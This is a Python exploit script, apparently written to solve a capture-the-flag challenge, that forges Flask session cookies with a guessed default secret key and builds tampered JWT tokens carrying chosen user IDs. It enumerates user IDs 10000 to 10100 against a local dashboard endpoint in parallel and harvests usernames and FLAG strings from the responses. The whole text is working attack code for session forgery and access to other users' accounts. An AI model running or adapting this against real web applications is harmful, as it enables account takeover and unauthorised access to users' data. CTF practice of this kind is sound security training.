import base64,json,urllib.request,urllib.error,re
from concurrent.futures import ThreadPoolExecutor
from flask.sessions import SecureCookieSessionInterface
from flask import Flask
app=Flask(__name__); app.secret_key='your_secret_key'
serializer=SecureCookieSessionInterface().get_signing_serializer(app)
def b64(x): return base64.urlsafe_b64encode(x).rstrip(b'=').decode()
def auth(uid): return b64(b'{"alg":"HS256","typ":"JWT"}')+'.'+b64(json.dumps({'username':'test','user_id':uid,'user_type':'customer'}).encode())+'.XXXX'
def check(uid):
    s=serializer.dumps({'user_id':uid}); a=auth(uid)
    req=urllib.request.Request('http://127.0.0.1:50255/dashboard',headers={'Cookie':f'session={s}; auth_token={a}'})
    try:
        r=urllib.request.urlopen(req,timeout=5); return uid,r.status,r.read().decode()
    except urllib.error.HTTPError as e: return uid,e.code,e.read().decode()
def scan(uid):
    uid,st,body=check(uid)
    if st!=400:
        return (uid,st,body)
    return None
res=[]
with ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(scan, range(10000,10101)):
        if r: res.append(r)
for uid,st,body in res:
    w=re.search(r'Welcome, [^<]*',body); f=re.search(r'FLAG\{[0-9a-f]+\}',body)
    print(uid,st,w.group(0) if w else '', f.group(0) if f else '')
print('done', [r[0] for r in res])
